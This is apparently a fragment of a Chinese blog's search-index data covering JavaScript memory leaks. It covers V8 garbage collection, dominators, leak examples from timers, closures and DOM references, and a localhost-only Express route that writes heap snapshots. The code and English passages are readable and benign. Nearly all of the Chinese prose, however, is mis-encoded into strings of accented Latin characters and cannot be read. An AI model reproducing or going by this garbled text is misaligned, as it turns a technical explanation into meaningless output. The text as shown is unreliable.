æ³•åˆ°è¾¾çš„å¯¹è±¡ï¼Œéƒ½ä¼šè¢«GCå›æ”¶ï¼Œä¾‹å¦‚ä¸‹å›¾çš„èŠ‚ç‚¹9å’Œ10 æ ¹èŠ‚ç‚¹çš„GCæ˜¯æ— æ³•æ§åˆ¶çš„ è·¯å¾„ ä»æ ¹èŠ‚ç‚¹å¼€å§‹åˆ°ç‰¹å®šå¯¹è±¡çš„è·¯å¾„ï¼Œå¦‚ä¸‹å›¾çš„1-2-4-6-8 æ”¯é…é¡¹ æ¯ä¸ªå¯¹è±¡æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ”¯é…é¡¹ï¼Œæ”¯é…é¡¹å¯¹å¯¹è±¡å¯èƒ½ä¸æ˜¯ç›´æ¥å¼•ç”¨ ä¸¾ä¾‹å­ èŠ‚ç‚¹1æ”¯é…èŠ‚ç‚¹2 èŠ‚ç‚¹2æ”¯æŒèŠ‚ç‚¹3ã€4ã€6 èŠ‚ç‚¹3æ”¯é…èŠ‚ç‚¹5 èŠ‚ç‚¹6æ”¯é…èŠ‚ç‚¹7 èŠ‚ç‚¹5æ”¯é…èŠ‚ç‚¹8 ä¸Šé¢çš„ä¾‹å­æœ‰ä¸ªä¸å¥½ç†è§£çš„æ˜¯èŠ‚ç‚¹2ä¸ºä»€ä¹ˆæ”¯é…äº†èŠ‚ç‚¹6ï¼Ÿå¦‚æœèŠ‚ç‚¹Aå­˜åœ¨äºä»æ ¹èŠ‚ç‚¹åˆ°èŠ‚ç‚¹Bçš„æ¯ä¸€ä¸ªè·¯å¾„ä¸­ï¼Œé‚£ä¹ˆAå°±æ˜¯Bçš„æ”¯é…é¡¹ã€‚2å­˜åœ¨äº1-2-4-6ï¼Œä¹Ÿå­˜åœ¨äº1-2-3-6ï¼Œæ‰€ä»¥èŠ‚ç‚¹2æ”¯é…èŠ‚ç‚¹6 V8 æ–°ç”Ÿä»£ä¸è€ç”Ÿä»£ v8å†…å­˜åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€ç”Ÿä»£å†…å­˜ï¼Œä¸¤å—å†…å­˜ä½¿ç”¨ä¸åŒçš„å†…å­˜GCç­–ç•¥ ç›¸æ¯”è€Œè¨€ï¼Œæ–°ç”Ÿä»£GCå¾ˆå¿«ï¼Œè€ç”Ÿä»£åˆ™è¾ƒæ…¢ æ–°ç”Ÿä»£çš„å†…å­˜åœ¨æŸäº›æ¡ä»¶ä¸‹ä¼šè¢«è½¬åˆ°è€ç”Ÿä»£å†…å­˜åŒº GCå‘ç”Ÿæ—¶ï¼Œç”¨å¯èƒ½åº”ç”¨ä¼šæš‚åœ è§£é™¤å¼•ç”¨çš„ä¸€äº›é”™è¯¯ var a = {name: \u0026#39;wdd\u0026#39;} delete a.name // è¿™å›è®©å¯¹è±¡aå˜æˆæ…¢å¯¹è±¡ var a = {name: \u0026#39;wdd\u0026#39;} a.name = null // è¿™ä¸ªåˆ™æ›´å¥½ å…³äºslow Object V8 optimizing compiler makes assumptions on your code to make optimizations. It transparently creates hidden classes that represent your objects. Using this hidden classes, V8 works much faster. If you \u0026ldquo;delete\u0026rdquo; properties, these assumptions are no longer valid, and the code is de-optimized, slowing your code. // Fast Object function FastPurchase(units, price) { this.units = units; this.price = price; this.total = 0; this.x = 1; } var fast = new FastPurchase(3, 25); // Slow Object function SlowPurchase(units, price) { this.units = units; this.price = price; this.total = 0; this.x = 1; } var slow = new SlowPurchase(3, 25); //x property is useless //so I delete it delete slow.x; Timerså†…å­˜æ³„éœ² // var buggyObject = { callAgain: function () { var ref = this; var val = setTimeout(function () { console.log(\u0026#39;Called again: \u0026#39; + new Date().toTimeString()); ref.callAgain(); }, 1000); } }; buggyObject.callAgain(); buggyObject = null; é—­åŒ…å†…å­˜æ³„éœ² var a = function () { var largeStr = new Array(1000000).join(\u0026#39;x\u0026#39;); return function () { return largeStr; }; }(); var a = function () { var smallStr = \u0026#39;x\u0026#39;, largeStr = new Array(1000000).join(\u0026#39;x\u0026#39;); return function (n) { return smallStr; }; }(); var a = function () { var smallStr = \u0026#39;x\u0026#39;, largeStr = new Array(1000000).join(\u0026#39;x\u0026#39;); return function (n) { eval(\u0026#39;\u0026#39;); //maintains reference to largeStr return smallStr; }; }(); DOM å†…å­˜æ³„éœ² #leaf maintains a reference to it\u0026rsquo;s parent (parentNode), and recursively up to #tree, so only when leafRef is nullified is the WHOLE tree under #tree candidate to be GC\nvar select = document.querySelector; var treeRef = select(\u0026#34;#tree\u0026#34;); var leafRef = select(\u0026#34;#leaf\u0026#34;); var body = select(\u0026#34;body\u0026#34;); body.removeChild(treeRef); //#tree can\u0026#39;t be GC yet due to treeRef treeRef = null; //#tree can\u0026#39;t be GC yet, due to //indirect reference from leafRef leafRef = null; //NOW can be #tree GC å®ˆåˆ™ Use appropiate scope Better than de-referencing, use local scopes. Unbind event listeners Unbind events that are no longer needed, specially if the related DOM objects are going to be removed. Manage local cache Be careful with storing large chunks of data that you are not going to use. åˆ†æå†…å­˜æ³„æ¼çš„å·¥å…· æµè§ˆå™¨ï¼š performance.memoryÂ devtool memory profile å…³äºé—­åŒ…çš„æç¤º ç»™é—­åŒ…å‘½åï¼Œè¿™æ ·åœ¨å†…å­˜åˆ†ææ—¶ï¼Œå°±å¯ä»¥æŒ‰ç…§å‡½æ•°åæ‰¾åˆ°å¯¹åº”çš„å‡½æ•° ","permalink":"https://wdd.js.org/fe/memory-leak-ppt/","summary":"å‚è€ƒ:Â http://slides.com/gruizdevilla/memory\nå†…å­˜æ˜¯ä¸€å¼ å›¾ åŸå§‹ç±»å‹ï¼Œåªèƒ½ä½œä¸ºå¶å­ã€‚åŸå§‹ç±»å‹ä¸èƒ½å¼•ç”¨å…¶ä»–ç±»å‹ æ•°å­— å­—ç¬¦ä¸² å¸ƒå°”å€¼ é™¤äº†åŸå§‹ç±»å‹ä¹‹å¤–ï¼Œå…¶ä»–ç±»å‹éƒ½æ˜¯å¯¹è±¡ï¼Œå…¶å®å°±æ˜¯é”®å€¼å¯¹ æ•°ç»„æ˜¯ä¸€ç§ç‰¹æ®Šå¯¹è±¡ï¼Œå®ƒçš„é”®æ˜¯è¿ç»­çš„æ•°å­— å†…å­˜ä»æ ¹å¼€å§‹ åœ¨æµè§ˆå™¨ä¸­ï¼Œæ ¹å¯¹è±¡æ˜¯window åœ¨nodejsä¸­ï¼Œæ ¹å¯¹è±¡æ˜¯global ä»»ä½•ä»æ ¹æ— æ³•åˆ°è¾¾çš„å¯¹è±¡ï¼Œéƒ½ä¼šè¢«GCå›æ”¶ï¼Œä¾‹å¦‚ä¸‹å›¾çš„èŠ‚ç‚¹9å’Œ10 æ ¹èŠ‚ç‚¹çš„GCæ˜¯æ— æ³•æ§åˆ¶çš„ è·¯å¾„ ä»æ ¹èŠ‚ç‚¹å¼€å§‹åˆ°ç‰¹å®šå¯¹è±¡çš„è·¯å¾„ï¼Œå¦‚ä¸‹å›¾çš„1-2-4-6-8 æ”¯é…é¡¹ æ¯ä¸ªå¯¹è±¡æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ”¯é…é¡¹ï¼Œæ”¯é…é¡¹å¯¹å¯¹è±¡å¯èƒ½ä¸æ˜¯ç›´æ¥å¼•ç”¨ ä¸¾ä¾‹å­ èŠ‚ç‚¹1æ”¯é…èŠ‚ç‚¹2 èŠ‚ç‚¹2æ”¯æŒèŠ‚ç‚¹3ã€4ã€6 èŠ‚ç‚¹3æ”¯é…èŠ‚ç‚¹5 èŠ‚ç‚¹6æ”¯é…èŠ‚ç‚¹7 èŠ‚ç‚¹5æ”¯é…èŠ‚ç‚¹8 ä¸Šé¢çš„ä¾‹å­æœ‰ä¸ªä¸å¥½ç†è§£çš„æ˜¯èŠ‚ç‚¹2ä¸ºä»€ä¹ˆæ”¯é…äº†èŠ‚ç‚¹6ï¼Ÿå¦‚æœèŠ‚ç‚¹Aå­˜åœ¨äºä»æ ¹èŠ‚ç‚¹åˆ°èŠ‚ç‚¹Bçš„æ¯ä¸€ä¸ªè·¯å¾„ä¸­ï¼Œé‚£ä¹ˆAå°±æ˜¯Bçš„æ”¯é…é¡¹ã€‚2å­˜åœ¨äº1-2-4-6ï¼Œä¹Ÿå­˜åœ¨äº1-2-3-6ï¼Œæ‰€ä»¥èŠ‚ç‚¹2æ”¯é…èŠ‚ç‚¹6 V8 æ–°ç”Ÿä»£ä¸è€ç”Ÿä»£ v8å†…å­˜åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€ç”Ÿä»£å†…å­˜ï¼Œä¸¤å—å†…å­˜ä½¿ç”¨ä¸åŒçš„å†…å­˜GCç­–ç•¥ ç›¸æ¯”è€Œè¨€ï¼Œæ–°ç”Ÿä»£GCå¾ˆå¿«ï¼Œè€ç”Ÿä»£åˆ™è¾ƒæ…¢ æ–°ç”Ÿä»£çš„å†…å­˜åœ¨æŸäº›æ¡ä»¶ä¸‹ä¼šè¢«è½¬åˆ°è€ç”Ÿä»£å†…å­˜åŒº GCå‘ç”Ÿæ—¶ï¼Œç”¨å¯èƒ½åº”ç”¨ä¼šæš‚åœ è§£é™¤å¼•ç”¨çš„ä¸€äº›é”™è¯¯ var a = {name: \u0026#39;wdd\u0026#39;} delete a.name // è¿™å›è®©å¯¹è±¡aå˜æˆæ…¢å¯¹è±¡ var a = {name: \u0026#39;wdd\u0026#39;} a.name = null // è¿™ä¸ªåˆ™æ›´å¥½ å…³äºslow Object V8 optimizing compiler makes assumptions on your code to make optimizations. It transparently creates hidden classes that represent your objects.","title":"JavaScriptå†…å­˜æ³„éœ²åˆ†æ"},{"content":"ä»€ä¹ˆæ˜¯å†…å­˜æ³„æ¼ï¼Ÿ å•ä½æ—¶é—´å†…çš„å†…å­˜å˜åŒ–é‡å¯èƒ½æœ‰ä¸‰ä¸ªå€¼\næ­£æ•°ï¼šå†…å­˜å¯èƒ½å­˜åœ¨æ³„æ¼ã€‚ç”Ÿäº§ç¯å¢ƒï¼Œå¦‚æœæœåŠ¡åœ¨å¯åŠ¨åï¼Œè¯¥å€¼ä¸€ç›´æ˜¯æ­£å€¼ï¼Œä»æœªå‡ºç°è´Ÿå€¼æˆ–è€…è¶‹è¿‘äº0çš„å€¼ï¼Œé‚£ä¹ˆæå¤§çš„å¯èƒ½æ˜¯å­˜åœ¨å†…å­˜æ³„æ¼çš„ã€‚ è¶‹è¿‘äº0çš„å€¼: å†…å­˜ç¨³å®šç»´æŒ è´Ÿæ•°ï¼šå†…å­˜åœ¨é‡Šæ”¾ å®é™…ä¸Šï¼Œåœ¨è§‚å¯Ÿå†…å­˜å˜åŒ–é‡æ—¶ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‰ææ¡ä»¶\nä¸€å®šçš„è´Ÿè½½å‹åŠ›ï¼šå› ä¸ºåœ¨å¼€å‘æˆ–è€…åŠŸèƒ½æµ‹è¯•ç¯å¢ƒï¼Œå¾ˆå°‘çš„ç”¨æˆ·ï¼ŒæœåŠ¡çš„å‹åŠ›å¾ˆå°ï¼Œæ˜¯å¾ˆéš¾è§‚æµ‹åˆ°å†…å­˜æ³„æ¼é—®é¢˜çš„ã€‚æ‰€ä»¥åŠ¡å¿…åœ¨ä¸€å®šçš„è´Ÿè½½å‹åŠ›ä¸‹è§‚æµ‹ã€‚ è‡³å°‘è¦è§‚æµ‹ä¸€å¤©ï¼šå†…å­˜ä¸Šæ¶¨å¹¶ä¸ä¸€å®šæ„å‘³ç€å­˜åœ¨å†…å­˜æ³„æ¼é—®é¢˜ã€‚åœ¨ä¸€ä¸ªå·¥ä½œæ—¥ä¸­ï¼ŒæŸäº›æ—¶é—´ç‚¹ï¼Œæ˜¯ç”¨æˆ·ä½¿ç”¨çš„é«˜å³°æœŸï¼ŒæœåŠ¡çš„è´Ÿè½½å¾ˆé«˜ï¼Œè‡ªç„¶å†…å­˜ä½¿ç”¨ä¼šå¢é•¿ã€‚å…³é”®åœ¨äºåœ¨é«˜å³°æœŸè¿‡åçš„ä½è°·æœŸæ—¶ï¼Œå†…å­˜æ˜¯å¦å›ä¸‹é™åˆ°æ­£å¸¸å€¼ã€‚å¦‚æœå†…å­˜åœ¨ä½è°·æœŸæ—¶ä¾ç„¶ç»´æŒç€é«˜å³°æœŸæ—¶çš„å†…å­˜ä½¿ç”¨ï¼Œé‚£ä¹ˆéå¸¸å¤§å¯èƒ½æ˜¯å­˜åœ¨å†…å­˜æ³„æ¼äº†ã€‚ ä¸‹å›¾æ˜¯ä¸¤ä¸ªæœåŠ¡çš„ã€‚ä»ç¬¬ä¸€å¤©çš„0ç‚¹å¼€å§‹è§‚æµ‹æœåŠ¡çš„å†…å­˜ï¼Œä¸€ç›´åˆ°ç¬¬äºŒå¤©çš„12ç‚¹ã€‚æ­£å¸¸çš„æœåŠ¡ä¼šéšç€è´Ÿè½½çš„å‹åŠ›å¢åŠ æˆ–è€…å‡å°‘å†…å­˜ä½¿ç”¨ã€‚è€Œå­˜åœ¨å†…å­˜æ³„æ¼çš„æœåŠ¡ï¼Œå†…å­˜ä¸€ç›´åœ¨ä¸Šå‡ï¼Œå¹¶ä¸”è´Ÿè½½å‹åŠ›è¶Šå¤§ï¼Œä¸Šå‡çš„è¶Šå¿«ã€‚\næœ‰æ²¡æœ‰å¯èƒ½é¿å…å†…å­˜æ³„æ¼ï¼Ÿ é™¤éä½ ä¸å†™ä»£ç ï¼Œå¦è€…ä½ æ˜¯æ— æ³•é¿å…å†…å­˜æ³„æ¼çš„é—®é¢˜çš„ã€‚\nç¬¬ä¸€ï¼Œå³ä½¿ä½ æ˜¯éå¸¸ç²¾é€šæŸä¸ªè¯­è¨€ï¼Œä¹Ÿæ˜¯æœ‰å¾ˆå¤šå…³äºå¦‚ä½•é¿å…å†…å­˜æ³„æ¼çš„ç»éªŒã€‚ä½†æ˜¯ä½ çš„ä»£ç é‡Œä»ç„¶å¯èƒ½ä¼šåŒ…å«å…¶ä»–åº“æˆ–è€…å…¶ä»–åŒäº‹å†™çš„ä»£ç ï¼Œé‚£äº›ä»£ç é‡Œæ˜¯æ— æ³•ä¿è¯æ˜¯å¦å­˜åœ¨å†…å­˜æ³„æ¼é—®é¢˜çš„ã€‚ ç¬¬äºŒï¼Œå†…å­˜æ³„æ¼çš„ä»£ç æœ‰æ—¶å€™éå¸¸éš¾ä»¥å¯Ÿè§‰ã€‚ä¾‹å¦‚console.logæ‰“å°çš„å¤ªå¿«ï¼Œå ç”¨å¤ªå¤šçš„bufferã€‚ç½‘ç»œæµé‡æ¿€å¢ï¼Œå ç”¨å¤ªå¤šçš„Recv_Qï¼Œnodeæ— æ³•åŠæ—¶å¤„ç†ã€‚å†™æ–‡ä»¶å¤ªæ…¢ï¼Œæ²¡æœ‰å¤„ç†â€œåå‹â€ç›¸å…³çš„é€»è¾‘ç­‰ç­‰ã€‚\nä¸ºä»€ä¹ˆè¦å…³æ³¨å†…å­˜æ³„æ¼ï¼Ÿ ä¸ºä»€ä¹ˆè¦å…³æ³¨å†…å­˜æ³„æ¼ï¼Ÿæˆ‘ä»¬å®¢æˆ·çš„æœåŠ¡å™¨å¯æ˜¯æœ‰500Gå†…å­˜çš„\nä½ å¯èƒ½æœ‰ä¸ªå¾ˆè±ªçš„é‡‘ä¸»ã€‚ä½†æ˜¯ä½ ä¸è¦å¿˜è®°ä¸€ä¸ªæ•…äº‹ã€‚\nä¼ è¯´å›½é™…è±¡æ£‹æ˜¯ç”±ä¸€ä½å°åº¦æ•°å­¦å®¶å‘æ˜çš„ã€‚å›½ç‹ååˆ†æ„Ÿè°¢è¿™ä½æ•°å­¦å®¶ï¼Œäºæ˜¯å°±è¯·ä»–è‡ªå·±è¯´å‡ºæƒ³è¦å¾—åˆ°ä»€ä¹ˆå¥–èµã€‚è¿™ä½æ•°å­¦å®¶æƒ³äº†ä¸€åˆ†é’Ÿåå°±æå‡ºè¯·æ±‚â€”â€”æŠŠ1ç²’ç±³æ”¾åœ¨æ£‹ç›˜çš„ç¬¬1æ ¼é‡Œï¼Œ2ç²’ç±³æ”¾åœ¨ç¬¬2æ ¼ï¼Œ4ç²’ç±³æ”¾åœ¨ç¬¬3æ ¼ï¼Œ8ç²’ç±³æ”¾åœ¨ç¬¬4æ ¼ï¼Œä¾æ¬¡ç±»æ¨ï¼Œæ¯ä¸ªæ–¹æ ¼ä¸­çš„ç±³ç²’æ•°é‡éƒ½æ˜¯ä¹‹å‰æ–¹æ ¼ä¸­çš„ç±³ç²’æ•°é‡çš„2å€ã€‚\nå›½ç‹æ¬£ç„¶åº”å…ï¼Œè¯§å¼‚äºæ•°å­¦å®¶ç«Ÿç„¶åªæƒ³è¦è¿™ä¹ˆä¸€ç‚¹çš„èµèµâ€”â€”ä½†éšåå´å¤§åƒäº†ä¸€æƒŠã€‚å½“ä»–å¼€å§‹å«äººæŠŠç±³æ”¾åœ¨æ£‹ç›˜ä¸Šæ—¶ï¼Œæœ€åˆå‡ ä¸ªæ–¹æ ¼ä¸­çš„ç±³ç²’å°‘å¾—åƒå‡ ä¹ä¸å­˜åœ¨ä¸€æ ·ã€‚ä½†æ˜¯ï¼Œå¾€ç¬¬16ä¸ªæ–¹æ ¼ä¸Šæ”¾ç±³ç²’æ—¶ï¼Œå°±éœ€è¦æ‹¿å‡º1å…¬æ–¤çš„å¤§ç±³ã€‚è€Œåˆ°äº†ç¬¬20æ ¼æ—¶ï¼Œä»–çš„é‚£äº›ä»†äººåˆ™éœ€è¦æ¨æ¥æ»¡æ»¡ä¸€æ‰‹æ¨è½¦çš„ç±³ã€‚å›½ç‹æ ¹æœ¬æ— æ³•æä¾›è¶³å¤Ÿçš„å¤§ç±³æ”¾åœ¨æ£‹ç›˜ä¸Šçš„ç¬¬64æ ¼ä¸Šå»ã€‚å› ä¸ºæ­¤æ—¶ï¼Œæ£‹ç›˜ä¸Šç±³ç²’çš„æ•°é‡ä¼šè¾¾åˆ°æƒŠäººçš„18 446 744 073 709 551 615ç²’ã€‚å¦‚æœæˆ‘ä»¬åœ¨ä¼¦æ•¦å¸‚ä¸­å¿ƒå†ç°è¿™ä¸€æ¸¸æˆï¼Œé‚£ä¹ˆç¬¬64æ ¼ä¸­çš„ç±³å †å°†å»¶ä¼¸è‡³M25ç¯åŸå…¬è·¯ï¼Œå…¶é«˜åº¦å°†è¶…è¿‡æ‰€æœ‰å»ºç­‘çš„é«˜åº¦ã€‚äº‹å®ä¸Šï¼Œè¿™ä¸€å †ç±³ç²’æ¯”è¿‡å»1000å¹´æ¥å…¨çƒå¤§ç±³çš„ç”Ÿäº§æ€»é‡è¿˜è¦å¤šå¾—å¤šã€‚\nå¯¹äºå†…å­˜æ³„æ¼æ¥è¯´ï¼Œå¯èƒ½500Géƒ½æ˜¯ä¸å¤Ÿç”¨çš„ã€‚\nå®é™…ä¸Šæ“ä½œç³»ç»Ÿå¯¹è¿›ç¨‹ä½¿ç”¨å†…å­˜èµ„æºæ˜¯æœ‰é™åˆ¶çš„ï¼Œæˆ‘ä»¬å…³æ³¨å†…å­˜æ³„æ¼ï¼Œå®é™…ä¸Šæ˜¯å…³æ³¨å†…å­˜æ³„æ¼ä¼šå¼•èµ·çš„æœ€ç»ˆé—®é¢˜ï¼šout of memoryã€‚å¦‚æœè¿›ç¨‹ä½¿ç”¨çš„èµ„æºæ•°å¼•èµ·äº†æ“ä½œç³»ç»Ÿçš„æ³¨æ„ï¼Œå¾ˆå¯èƒ½è¿›ç¨‹è¢«æ“ä½œç³»ç»Ÿæ€æ­»ã€‚\nç„¶åä½ çš„å®¢æˆ·å¯èƒ½æ­£åœ¨ä½¿ç”¨ä½ çš„æœåŠ¡å®Œæˆä¸€ä¸ªé‡è¦çš„äº‹æƒ…ï¼Œæ¥ç€ä½ ä»¬çš„å®¢æˆ·æŠ•è¯‰çƒ­çº¿å›è¢«æ‰“çˆ†ï¼Œç„¶åæ˜¯ä½ çš„è€æ¿ï¼Œä½ çš„é¢†å¯¼æ‰¾ä½ è°ˆè¯~~~\nåŸºæœ¬ç±»å‹ vs å¼•ç”¨ç±»å‹ åŸºæœ¬ç±»å‹ï¼šundefined, null, boolean, number, stringã€‚åŸºæœ¬ç±»å‹æ˜¯æŒ‰å€¼è®¿é—® å¼•ç”¨ç±»å‹çš„å€¼å®é™…ä¸Šæ˜¯æŒ‡å‘å†…å­˜ä¸­çš„å¯¹è±¡ ä¸Šé¢çš„è¯´æ³•æ¥è‡ªã€ŠJavaScripté«˜çº§ç¨‹åºè®¾è®¡ã€‹ã€‚ä½†æ˜¯å¯¹äºåŸºæœ¬ç±»å‹å­—ç¬¦ä¸²çš„å®šä¹‰ï¼Œå®é™…ä¸Šæˆ‘æ˜¯æœ‰äº›ä¸è®¤åŒçš„ã€‚æœ‰äº›äººä¹Ÿè®¤ä¸ºå­—ç¬¦ä¸²ä¸å±äºåŸºæœ¬ç±»å‹ã€‚\nå°±æ˜¯å…³äºå­—ç¬¦ä¸²ï¼Œæˆ‘æ›¾æ€è€ƒè¿‡ï¼Œåœ¨JavaScripté‡Œï¼Œå­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦æ˜¯å¤šå°‘ï¼Œå­—ç¬¦ä¸²æœ€å¤šèƒ½è£…ä¸‹å¤šå°‘ä¸ªå­—ç¬¦ï¼Ÿ\næˆ‘ä¸ªäººè®¤ä¸ºï¼Œä¸€ä¸ªå˜é‡æœ‰å›ºå®šçš„å¤§å°çš„å†…å­˜å ç”¨ï¼Œæ‰æ˜¯åŸºæœ¬ç±»å‹ã€‚ä¾‹å¦‚æ•°å­—ï¼Œnull, å¸ƒå°”å€¼ï¼Œè¿™äº›å€¼å¾ˆå®¹æ˜“èƒ½ç†è§£ä»–ä»¬ä¼šå ç”¨å›ºå®šçš„å†…å­˜å¤§å°ã€‚ä½†æ˜¯å­—ç¬¦ä¸²å°±ä¸ä¸€æ ·äº†ã€‚å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯ä¸å›ºå®šï¼Œåœ¨ä¸åŒçš„æµè§ˆå™¨ä¸­ï¼Œæœ‰äº›å­—ç¬¦ä¸²æœ€å¤§å¯èƒ½å ç”¨256Mçš„å†…å­˜ï¼Œç”šè‡³æ›´å¤šã€‚\nå¯ä»¥å‚è€ƒè¿™ä¸ªé—®é¢˜ï¼šhttps://stackoverflow.com/questions/34957890/javascript-string-size-limit-256-mb-for-me-is-it-the-same-for-all-browsers\nå†…å­˜æ˜¯ä¸€å¼ å›¾ 1ä»£è¡¨æ ¹èŠ‚ç‚¹ï¼Œåœ¨NodeJSé‡Œæ˜¯globalå¯¹è±¡ï¼Œåœ¨æµè§ˆå™¨ä¸­æ˜¯windowå¯¹è±¡ 2-6ä»£è¡¨å¯¹è±¡ 7-8ä»£è¡¨åŸå§‹ç±»å‹ã€‚åˆ†åˆ«æœ‰ä¸‰ç§ï¼Œå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”å€¼ 9-10ä»£è¡¨ä»æ ¹èŠ‚ç‚¹æ— æ³•åˆ°è¾¾çš„å¯¹è±¡ æ³¨æ„ï¼Œä½œä¸ºåŸå§‹ç±»å‹çš„å€¼ï¼Œåœ¨å†…å­˜å›¾ä¸­åªèƒ½æ˜¯å¶å­èŠ‚ç‚¹ã€‚ ** ä»è·ŸèŠ‚ç‚¹R0æ— æ³•åˆ°è¾¾çš„èŠ‚ç‚¹9,10ï¼Œå°†ä¼šåœ¨GCæ—¶è¢«æ¸…é™¤ã€‚\nä¿ç•™è·¯å¾„çš„å«ä¹‰æ˜¯ä»è·Ÿå¯¹è±¡åˆ°æŸä¸€èŠ‚ç‚¹çš„æœ€çŸ­è·¯å¾„ã€‚ä¾‹å¦‚1-\u0026gt;2-\u0026gt;4-\u0026gt;6ã€‚\nå¯¹è±¡ä¿ç•™æ ‘ èŠ‚ç‚¹ï¼š æ„é€ å‡½æ•°çš„åç§° è¾¹ç¼˜ï¼šå¯¹è±¡çš„key è·ç¦»: èŠ‚ç‚¹åˆ°è·ŸèŠ‚ç‚¹çš„æœ€çŸ­è·ç¦» æ”¯é…é¡¹(Dominators) æ¯ä¸ªå¯¹è±¡æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªæ”¯é…é¡¹ å¦‚æœBå­˜åœ¨ä»æ ¹èŠ‚ç‚¹åˆ°AèŠ‚ç‚¹ä¹‹é—´çš„æ‰€æœ‰è·¯å¾„ä¸­ï¼Œé‚£ä¹ˆBæ˜¯Açš„æ”¯é…é¡¹ï¼Œå³Bæ”¯é…Aã€‚ ä¸‹å›¾ä¸­\n1æ”¯é…2 2æ”¯é…3,4,6 (æƒ³æƒ³2ä¸ºä»€ä¹ˆæ²¡æœ‰æ”¯é…5ï¼Ÿ) 3æ”¯é…5 6æ”¯é…7 5æ”¯é…8 ç†è§£æ”¯é…é¡¹çš„æ„ä¹‰åœ¨äºç†è§£å¦‚ä½•å°†èµ„æºé‡Šæ”¾ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¦‚æœç›®æ ‡æ˜¯é‡Šæ”¾èŠ‚ç‚¹6çš„å ç”¨èµ„æºï¼Œä»…ä»…é‡Šæ”¾èŠ‚ç‚¹3æˆ–è€…èŠ‚ç‚¹4æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå¿…éœ€é‡Šæ”¾å…¶æ”¯é…é¡¹èŠ‚ç‚¹2ï¼Œæ‰èƒ½å°†èŠ‚ç‚¹6é‡Šæ”¾ã€‚ å¯¹è±¡å¤§å° å¯¹è±¡è‡ªèº«å ç”¨å¤§å°ï¼šshadow size é€šè¿‡ä¿æŒå¯¹å…¶ä»–å¯¹è±¡çš„å¼•ç”¨éšå¼å ç”¨ï¼Œè¿™ç§æ–¹å¼å¯ä»¥é˜»æ­¢è¿™äº›å¯¹è±¡è¢«åƒåœ¾å›æ”¶å™¨ï¼ˆç®€ç§° GCï¼‰è‡ªåŠ¨å¤„ç½® å¯¹è±¡çš„å¤§å°çš„å•ä½æ˜¯å­—èŠ‚ åˆ†æå·¥å…· heapsnapshot import {writeHeapSnapshot} from \u0026#39;v8\u0026#39; router.get(\u0026#39;/heapdump\u0026#39;, function (req: express.Request, res: express. Response, next: express.NextFunction) { logger.debug(\u0026#39;help_heapdump::\u0026#39;, req.ip, req.hostname) if (req.hostname !== \u0026#39;localhost\u0026#39;) { logger.error(\u0026#39;error:report_bad_host:\u0026#39;, req.hostname) return res.status(401).end() } res.status(200).end() let fileName = writeHeapSnapshot(\u0026#39;node.heapsnapshot\u0026#39;) logger.info(\u0026#39;help_heapdumap_file::\u0026#39;, fileName) }) é€šè¿‡å°†v8 writeHeapSnapshotæ”¾åˆ°expressçš„è·¯ç”±ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•é€šè¿‡curlçš„æ–¹å¼äº§ç”Ÿsnapshotæ–‡ä»¶ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒwriteHeapSnapshotå¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´æ¥äº§ç”Ÿsnapshotæ–‡ä»¶ã€‚åœ¨ç”Ÿäº§ç¯å¢ƒè¦æ³¨æ„ï¼Œéœ€è¦æ³¨æ„äº§ç”Ÿè¯¥å‡½æ•°çš„è°ƒç”¨é¢‘ç‡ã€‚\næ‹¿åˆ°snapshotæ–‡ä»¶åï¼Œä¸‹ä¸€æ­¥æ˜¯ä½¿ç”¨chrome dev-toolså»æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ã€‚\nåœ¨chromeçš„inspecté¡µé¢ï¼šchrome://inspect/#devices\nç‚¹å‡»Open dedicated DevTools for Nodeã€‚å¯ä»¥æ‰“å¼€ä¸€ä¸ªå•ç‹¬çš„é¡µé¢dev-toolsé¡µé¢ã€‚å½“ç„¶ä½ ä¹Ÿå¯ä»¥ä»»æ„ä¸€ä¸ªé¡µé¢æ‰“å¼€devTools.\nç‚¹å‡»load, é€‰æ‹©snapshotæ–‡ä»¶ï¼Œå°±å¯ä»¥åŠ è½½äº†ã€‚ çœŸå®çš„å†…å­˜æ³„æ¼å®æˆ˜åˆ†æ: socket.ioå†…å­˜æ³„æ¼ æˆ‘å†™è¿‡ä¸€ä¸ªä½¿ç”¨socket.ioæ¥å®Œæˆå®æ—¶æ¶ˆæ¯æ¨é€çš„æœåŠ¡ï¼Œåœ¨åšå‹åŠ›æµ‹è¯•çš„æ—¶å€™ï¼Œä¸¤ä¸ªå®ä¾‹ï¼Œæ¨¡æ‹Ÿ2000ä¸ªå®¢æˆ·ç«¯WebSocketè¿æ¥ï¼Œç„¶åä»¥æ¯ç§’1000ä¸ªé€Ÿåº¦å‘é€æ¶ˆæ¯ï¼Œåœ¨æŒç»­å‹æµ‹15ä¸ªå°æ—¶ä¹‹åï¼ŒNode.jsçš„å†…å­˜ä»50Mä¸Šæ¶¨åˆ°1.5Gã€‚æ‰€ä»¥ï¼Œè¿™å…¶ä¸­å¿…ç„¶äº§ç”Ÿäº†å†…å­˜æ³„æ¼ã€‚\nåœ¨arrayè¿™ä¸€åˆ—ï¼Œå¯ä»¥çœ‹å‡ºå®ƒå ç”¨çš„Shallow Sizeå’ŒRetained Sizeå ç”¨çš„å†…å­˜éƒ½æ˜¯è¶…è¿‡90%çš„ã€‚ 